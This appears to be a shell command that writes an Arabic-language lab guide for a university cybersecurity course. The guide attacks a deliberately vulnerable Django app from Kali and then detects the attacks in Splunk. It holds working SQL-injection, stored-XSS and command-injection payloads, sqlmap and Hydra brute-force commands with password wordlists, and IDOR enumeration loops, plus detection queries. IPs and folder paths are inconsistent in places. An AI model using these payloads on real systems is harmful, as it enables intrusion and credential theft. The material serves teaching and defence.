cat > /mnt/user-data/outputs/Full_Lab_Execution_Guide.md << 'ENDOFFILE'
# 🧪 دليل التنفيذ الكامل — خطوة بخطوة
## DEPI Cybersecurity Lab | Web Application Security Assessment

---

## 🗺️ نظرة عامة على الخطوات

```
[A] إعداد الـ Windows Server (الضحية)   → Django App + Splunk UF يشتغلوا
[B] إعداد Kali Linux (المهاجم)          → verify الشبكة + تجهيز الأدوات
[C] Reconnaissance                       → nmap + اكتشاف الـ endpoints
[D] Manual Attack (Burp Suite)           → SQLi, XSS, IDOR, Brute Force, CMDi
[E] Automated Attack (Python Script)     → توليد مئات الـ logs تلقائياً
[F] التحقق من Splunk                     → التأكد إن الـ logs وصلت
[G] SOC Investigation (SPL Queries)      → تشغيل الاستعلامات وأخذ Screenshots
```

---

## [A] إعداد Windows Server (الضحية) — افتح على الـ VM أو الـ Machine

### A1 — تشغيل Django Server
```batch
REM افتح Command Prompt as Administrator
cd C:\DjangoApp
venv\Scripts\activate

REM تشغيل الـ server على كل الـ interfaces عشان Kali يوصله
python manage.py runserver 0.0.0.0:8000
```
**تأكد إن الـ output فيه:**
```
Starting development server at http://0.0.0.0:8000/
Quit the server with CTRL-BREAK.
```

### A2 — إنشاء بيانات تجريبية في قاعدة البيانات
```batch
REM في terminal تاني (مع تفعيل venv)
cd C:\DjangoApp
venv\Scripts\activate

python manage.py shell
```
```python
# داخل الـ Django shell
from vuln_app.models import UserProfile, Announcement

# إنشاء مستخدمين
UserProfile.objects.create(username='admin',    password='admin123',   email='admin@depi.gov.eg',    is_admin=True)
UserProfile.objects.create(username='student1', password='pass123',    email='s1@depi.gov.eg',       is_admin=False)
UserProfile.objects.create(username='faculty',  password='faculty2024',email='prof@depi.gov.eg',     is_admin=False)
UserProfile.objects.create(username='ahmed',    password='ahmed@2024', email='ahmed@depi.gov.eg',    is_admin=False)

# إنشاء announcements
Announcement.objects.create(title='Welcome!', body='Semester starts Sept 15', author_id=1)
Announcement.objects.create(title='Exam Info', body='Midterm on Oct 20', author_id=1)

print("✓ Data created")
exit()
```

### A3 — التأكد إن Splunk Universal Forwarder شغّال
```batch
REM في Command Prompt as Administrator
cd "C:\Program Files\SplunkUniversalForwarder\bin"
splunk status

REM لو مش شغّال:
splunk start
```
**Expected output:**
```
splunkd is running (PID: XXXX)
```

### A4 — التحقق من الـ Firewall (عشان Kali يوصل للـ port 8000)
```batch
REM إضافة استثناء Firewall
netsh advfirewall firewall add rule ^
  name="Django Dev Server" ^
  dir=in action=allow protocol=TCP localport=8000

REM التحقق
netsh advfirewall firewall show rule name="Django Dev Server"
```

---

## [B] إعداد Kali Linux (المهاجم)

### B1 — معرفة الـ IP بتاع Kali
```bash
# افتح Terminal في Kali
ip addr show
# أو
ifconfig

# ابحث عن إدخال زي:
# eth0: inet 192.168.1.4/24   ← ده الـ IP بتاع Kali
```

### B2 — تعريف متغيرات البيئة (حط الـ IPs الصح)
```bash
# عدّل القيم دي حسب الـ IPs في الـ Lab بتاعك
export TARGET_IP="192.168.1.3"          # IP الـ Windows Server
export TARGET="http://$TARGET_IP:8000"  # عنوان الـ Django App الكامل
export KALI_IP="192.168.1.4"            # IP الـ Kali

# تأكيد
echo "Target: $TARGET"
echo "Kali  : $KALI_IP"
```

### B3 — اختبار الاتصال
```bash
# Ping اختبار
ping -c 3 $TARGET_IP

# Expected output:
# 3 packets transmitted, 3 received, 0% packet loss

# لو فيه packet loss → تحقق من network settings الـ VMs
```

### B4 — التحقق إن الـ Site شغّال
```bash
curl -I $TARGET

# Expected output:
# HTTP/1.1 200 OK
# Content-Type: text/html; charset=utf-8
# Server: WSGIServer/0.2 CPython/3.x.x
```

### B5 — تثبيت الأدوات المطلوبة
```bash
# تحديث الـ repos
sudo apt update -y

# الأدوات (معظمها موجودة أصلاً في Kali)
sudo apt install -y \
    nmap \
    hydra \
    sqlmap \
    curl \
    wget \
    python3-pip

# تثبيت الـ Python requirements للـ automation script
pip3 install requests
```

---

## [C] Reconnaissance (استطلاع الهدف)

### C1 — Nmap Scan
```bash
# إنشاء مجلد للنتائج
mkdir -p ~/depi_lab/recon
cd ~/depi_lab/recon

# Fast scan أول (الـ ports الشائعة)
nmap -sV -sC $TARGET_IP -oN nmap_quick.txt
cat nmap_quick.txt

# Full scan (كل الـ ports)
nmap -sV -sC -p- $TARGET_IP -oN nmap_full.txt
```

**Expected Output:**
```
PORT     STATE SERVICE  VERSION
8000/tcp open  http     WSGIServer 0.2 (Python 3.x)
| http-title: DEPI E-Learning Portal
```

### C2 — اكتشاف الـ Endpoints يدوياً
```bash
# انسخ والصق قائمة الـ endpoints وجرّبها
for ep in "/" "/admin/" "/login/" "/search/" "/grades/" \
          "/announcements/" "/comments/" "/ping/" "/api/"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ep")
    echo "[$STATUS] $TARGET$ep"
done
```

**Expected Output:**
```
[200] http://192.168.1.100:8000/
[302] http://192.168.1.100:8000/admin/
[200] http://192.168.1.100:8000/login/
[200] http://192.168.1.100:8000/search/
[200] http://192.168.1.100:8000/grades/
[200] http://192.168.1.100:8000/ping/
```

---

## [D] Manual Attack — Burp Suite

### D0 — تشغيل Burp Suite
```bash
# افتح Burp Suite
burpsuite &
# أو من Applications → Web Application Analysis → Burp Suite
```
1. اختار **Temporary project** → Next
2. اختار **Use Burp defaults** → Start Burp
3. اذهب لـ **Proxy → Options** → تأكد Listener على `127.0.0.1:8080`
4. افتح **Firefox في Kali**
5. Settings → Network Settings → Manual Proxy → `127.0.0.1` port `8080`
6. اذهب لـ `http://192.168.1.100:8000` في Firefox

---

### D1 — اختبار SQL Injection (على `/search/`)

**عبر المتصفح مباشرةً:**
```
http://192.168.1.100:8000/search/?username=admin
                                              ↑ غيّر ده بالـ payloads دول
```

**الـ Payloads جرّبها واحد واحد:**
```
Payload 1 — Detection probe:
  http://192.168.1.100:8000/search/?username='

Payload 2 — Return all records:
  http://192.168.1.100:8000/search/?username=' OR '1'='1

Payload 3 — Auth bypass:
  http://192.168.1.100:8000/search/?username=admin'--

Payload 4 — UNION to dump DB version:
  http://192.168.1.100:8000/search/?username=' UNION SELECT 1,sqlite_version(),3--

Payload 5 — UNION to dump users table:
  http://192.168.1.100:8000/search/?username=' UNION SELECT 1,username,password FROM vuln_app_userprofile--

Payload 6 — List all tables:
  http://192.168.1.100:8000/search/?username=' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--
```

**عبر sqlmap (أتمتة كاملة):**
```bash
mkdir -p ~/depi_lab/sqli

# Basic detection
sqlmap -u "$TARGET/search/?username=test" \
  --dbs --batch \
  -o --output-dir=~/bsu_lab/sqli

# Dump the users table
sqlmap -u "$TARGET/search/?username=test" \
  -D db \
  -T vuln_app_userprofile \
  --dump --batch \
  --output-dir=~/bsu_lab/sqli

# SQLi in login form
sqlmap -u "$TARGET/login/" \
  --data="username=test&password=test" \
  --dbs --batch \
  --output-dir=~/bsu_lab/sqli
```

**📸 خُد Screenshot كل ما تشوف نتيجة (لـ Splunk والتقرير)**

---

### D2 — اختبار Brute Force Login (على `/login/`)

**إنشاء ملفات الـ Wordlists:**
```bash
mkdir -p ~/depi_lab/bruteforce

# ملف الـ usernames
cat > ~/depi_lab/bruteforce/users.txt << 'EOF'
admin
administrator
student
faculty
root
user
depi
bsu
ahmed
EOF

# ملف الـ passwords
cat > ~/depi_lab/bruteforce/passwords.txt << 'EOF'
password
123456
admin
admin123
letmein
qwerty
P@ssword
welcome
depi2024
bsu2024
Summer2024
student123
faculty2024
ahmed@2024
EOF
```

**هجوم الـ Hydra:**
```bash
hydra -L ~/bsu_lab/bruteforce/users.txt \
      -P ~/bsu_lab/bruteforce/passwords.txt \
      $TARGET_IP \
      -s 8000 \
      http-post-form "/login/:username=^USER^&password=^PASS^:Invalid credentials" \
      -t 4 \
      -V \
      -o ~/depi_lab/bruteforce/hydra_results.txt

# عرض النتائج
cat ~/depi_lab/bruteforce/hydra_results.txt
```

**Expected output:**
```
[8000][http-post-form] host: 192.168.1.100
  login: admin  password: admin123
```

---

### D3 — اختبار Stored XSS (على `/announcements/create/`)

**في Burp Suite → Repeater:**

```
POST /announcements/create/ HTTP/1.1
Host: 192.168.1.100:8000
Content-Type: application/x-www-form-urlencoded

title=Test&body=<script>alert('XSS-BSU')</script>&course=1
```

**أو عبر curl:**
```bash
mkdir -p ~/depi_lab/xss

XSS_PAYLOADS=(
  '<script>alert("XSS-1")</script>'
  '<img src=x onerror=alert(document.domain)>'
  '<svg onload=alert(1)>'
  '<details open ontoggle=alert(1)>'
  '<body onload=alert("XSS")>'
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "$TARGET/announcements/create/" \
      --data-urlencode "title=Notice" \
      --data-urlencode "body=$payload" \
      --data-urlencode "course=1"
    echo ""
    sleep 0.3
done
```

**للتحقق من الـ Stored XSS:**
```
افتح المتصفح واذهب لـ: http://192.168.1.100:8000/announcements/
لو ظهر alert box → الـ XSS ناجح ✓
```

---

### D4 — اختبار IDOR (على `/grades/<id>/`)

```bash
mkdir -p ~/depi_lab/idor

echo "[*] Testing IDOR on /grades/ endpoint"
for id in $(seq 1 20); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/grades/$id/")
    if [ "$STATUS" = "200" ]; then
        echo "[✓ EXPOSED] /grades/$id/ → HTTP $STATUS"
        curl -s "$TARGET/grades/$id/" >> ~/bsu_lab/idor/exposed_$id.html
    else
        echo "[ ] /grades/$id/ → HTTP $STATUS"
    fi
    sleep 0.1
done
```

---

### D5 — اختبار Command Injection (على `/ping/`)

```bash
mkdir -p ~/depi_lab/cmdi

CMDI_PAYLOADS=(
    "127.0.0.1"
    "127.0.0.1 & whoami"
    "127.0.0.1 & hostname"
    "127.0.0.1 & ipconfig /all"
    "127.0.0.1 & net user"
    "127.0.0.1 & systeminfo"
    "127.0.0.1 & dir C:\\"
    "127.0.0.1 & tasklist"
    "127.0.0.1 & netstat -an"
)

for payload in "${CMDI_PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    RESPONSE=$(curl -s --get "$TARGET/ping/" \
                --data-urlencode "host=$payload")

    # لو الـ response فيه output من الأوامر (أكبر من الـ ping العادي)
    SIZE=${#RESPONSE}
    if [ "$SIZE" -gt 500 ]; then
        echo "    [✓ COMMAND EXECUTED] Response size: $SIZE chars"
        echo "$RESPONSE" > ~/bsu_lab/cmdi/output_$(echo $payload | tr ' &' '__').txt
    else
        echo "    [ ] Response size: $SIZE chars"
    fi
    sleep 0.4
done

echo "[*] Results saved in ~/bsu_lab/cmdi/"
```

---

## [E] تشغيل الـ Attack Automation Script

```bash
# نقل السكربت للـ Lab folder
mkdir -p ~/depi_lab/automation
cp ~/attack_automation.py ~/depi_lab/automation/
cd ~/depi_lab/automation

# تعديل الـ TARGET_IP في السكربت
sed -i "s/192.168.1.100/$TARGET_IP/g" attack_automation.py

# تشغيله
python3 attack_automation.py --run

# مشاهدة الـ log
tail -f red_team_attack_log.txt
```

**Expected output:**
```
[2024-11-10 03:15:22] [INFO    ] ============================================================
[2024-11-10 03:15:22] [INFO    ]   DEPI Cybersecurity Project — Attack Automation
[2024-11-10 03:15:22] [INFO    ]   Target : http://192.168.1.3:8000
...
[2024-11-10 03:16:44] [REQUEST ] GET /search/ | params={'username': ["' UNION SELECT 1,username,password..."]} → HTTP 200
[2024-11-10 03:17:01] [SUCCESS ] [SQLI] ⚠ Response larger than normal — possible data leak
...
[2024-11-10 03:20:15] [INFO    ]   SIMULATION COMPLETE — Check Splunk for attack logs
```

---

## [F] التحقق من وصول الـ Logs لـ Splunk Enterprise

**على الـ SOC Machine (Splunk Enterprise):**

```
1. افتح المتصفح: http://localhost:8000  (أو IP الـ Splunk machine)
2. Login: admin / [كلمة السر اللي عملتها]
3. اذهب لـ: Search & Reporting
4. شغّل الـ query ده للتأكد:
```

```spl
index=django_security | head 20
```

**لو ظهرت نتائج → الـ logs وصلت ✓**
**لو مفيش نتائج → تحقق من:**
```
- Splunk UF شغّال على الـ Windows Server؟
- outputs.conf عنده الـ IP الصح لـ Splunk Enterprise؟
- Splunk Enterprise بيسمع على port 9997؟
  Settings → Forwarding and Receiving → Receive Data → 9997
```

---

## [G] SOC Investigation — تشغيل الـ SPL Queries

**الـ queries دي بالترتيب في Splunk:**

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 1: كل الـ events
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| head 100
| table _time, IP, METHOD, URI, USER_AGENT
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 2: Brute Force Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "METHOD=(?<method>[A-Z]+)"
| where uri="/login/" AND method="POST"
| bin _time span=5m
| stats count as attempts by _time, src_ip
| where attempts >= 3
| sort -attempts
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 3: SQL Injection Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "GET=(?<get_params>\{.*?\})"
| eval combined = uri + " " + coalesce(get_params,"")
| where match(combined,"(?i)(union\s+select|or\s+1=1|'--|sleep\(|sqlite_version)")
| eval attack="SQL Injection 🟠"
| table _time, src_ip, uri, get_params, attack
| sort -_time
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 4: XSS Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "POST=(?<post>\{.*?\})"
| where match(coalesce(post,""),"(?i)(<script|onerror=|onload=|javascript:)")
| eval attack="Stored XSS 🟡"
| table _time, src_ip, post, attack
| sort -_time
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 5: Command Injection Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "GET=(?<get>\{.*?\})"
| where match(coalesce(get,""),"(?i)(\bwhoami\b|hostname|systeminfo|net\s+user|ipconfig|tasklist|\&\s*\w+)")
| eval attack="Command Injection 🔴"
| table _time, src_ip, get, attack
| sort -_time
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 6: IDOR Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| where match(uri,"^/grades/\d+/")
| rex field=uri "^/grades/(?<id>\d+)/"
| stats values(id) as ids_accessed, count by src_ip
| where count > 3
| eval attack="IDOR 🟠"
```

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Query 7: Master Attack Dashboard
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
```spl
index=django_security sourcetype=django_security_log
| rex field=_raw "IP=(?<src_ip>[^\s|]+)"
| rex field=_raw "URI=(?<uri>[^\s|]+)"
| rex field=_raw "GET=(?<get>\{.*?\})"
| rex field=_raw "POST=(?<post>\{.*?\})"
| eval payload = coalesce(get,"") + " " + coalesce(post,"") + " " + uri
| eval attack_type = case(
    match(payload,"(?i)(\bwhoami\b|systeminfo|\&\s*\w+)"),    "RCE/CMDi 🔴",
    match(payload,"(?i)(union\s+select|or\s+1=1|'--)"),       "SQL Injection 🟠",
    match(payload,"(?i)(<script|onerror=|javascript:)"),       "XSS 🟡",
    match(payload,"(?i)(/grades/\d+/)"),                       "IDOR 🟠",
    match(uri,"/login/"),                                      "Brute Force 🟠",
    true(),                                                    "Recon 🔵"
  )
| stats count as events by src_ip, attack_type
| sort -events
```

---

## 📸 Screenshots اللازمة للتقرير

```
✓ Screenshot 1: الـ Django app شغّال على المتصفح
✓ Screenshot 2: نتيجة nmap scan
✓ Screenshot 3: SQLi — الصفحة بتعرض بيانات من قاعدة البيانات
✓ Screenshot 4: Hydra — إيجاد credentials صح
✓ Screenshot 5: XSS — alert box ظهر في المتصفح
✓ Screenshot 6: IDOR — عرض grade record مش بتاعك
✓ Screenshot 7: Command Injection — الـ command output ظهر
✓ Screenshot 8: Splunk — الـ events واصلة (Query 1)
✓ Screenshot 9: Splunk — Brute Force detection (Query 2)
✓ Screenshot 10: Splunk — SQLi detection (Query 3)
✓ Screenshot 11: Splunk — XSS detection (Query 4)
✓ Screenshot 12: Splunk — CMDi detection (Query 5)
✓ Screenshot 13: Splunk — Master Dashboard (Query 7)
```

---

## ⚡ Cheat Sheet — كل الأوامر في مكان واحد

```bash
# ── Setup ────────────────────────────────────────────
export TARGET_IP="192.168.1.100"
export TARGET="http://$TARGET_IP:8000"
export KALI_IP="192.168.1.200"

# ── Connectivity ──────────────────────────────────────
ping -c 3 $TARGET_IP
curl -I $TARGET

# ── Reconnaissance ────────────────────────────────────
nmap -sV -sC $TARGET_IP -oN nmap.txt

# ── Endpoint Discovery ────────────────────────────────
for ep in "/" "/admin/" "/login/" "/search/" "/grades/" "/ping/"; do
    echo "[$(curl -so/dev/null -w %{http_code} $TARGET$ep)] $ep"
done

# ── SQL Injection ─────────────────────────────────────
sqlmap -u "$TARGET/search/?username=test" --dbs --batch

# ── Brute Force ───────────────────────────────────────
hydra -L users.txt -P passwords.txt $TARGET_IP -s 8000 \
  http-post-form "/login/:username=^USER^&password=^PASS^:Invalid" -t4

# ── Command Injection (manual) ────────────────────────
curl -G "$TARGET/ping/" --data-urlencode "host=127.0.0.1 & whoami"
curl -G "$TARGET/ping/" --data-urlencode "host=127.0.0.1 & systeminfo"

# ── Automation Script ─────────────────────────────────
python3 attack_automation.py --run

# ── Verify Splunk ─────────────────────────────────────
# → Splunk UI → Search: index=django_security | head 50
```
ENDOFFILE
echo "done"